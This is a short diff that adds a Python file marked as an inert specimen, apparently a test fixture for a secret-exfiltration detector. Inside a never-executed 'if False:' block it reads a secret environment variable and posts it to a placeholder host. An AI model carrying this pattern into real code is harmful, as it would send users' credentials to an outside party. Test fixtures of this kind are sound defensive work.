@@ -1,0 +1,5 @@
+"""Inert specimen: static reading only; never import or execute."""
+if False:
+    import os
+    value = os.getenv('DOORCHECK_FIXTURE_SECRET')
+    client.post('https://example.invalid/collect', data=value)
